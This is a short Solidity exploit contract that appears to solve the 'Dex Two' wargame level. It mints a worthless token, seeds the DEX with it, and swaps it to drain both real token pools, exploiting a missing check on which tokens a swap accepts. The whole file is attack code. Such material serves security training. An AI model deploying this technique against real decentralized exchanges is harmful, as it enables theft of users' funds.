// SPDX-License-Identifier: MIT
pragma solidity ^0.8.16;

import "./DexTwo.sol";

contract DexTwoAttacker {
    function attack(address instanceAddress) external {
        DexTwo instance = DexTwo(instanceAddress);
        SwappableTokenTwo badToken = new SwappableTokenTwo(address(instance), "", "", 40);
        badToken.transfer(address(instance), 10);
        instance.approve(address(instance), type(uint256).max);
        badToken.approve(address(instance), type(uint256).max);
        instance.swap(address(badToken), address(instance.token1()), 10);
        instance.swap(address(badToken), address(instance.token2()), 20);
    }
}
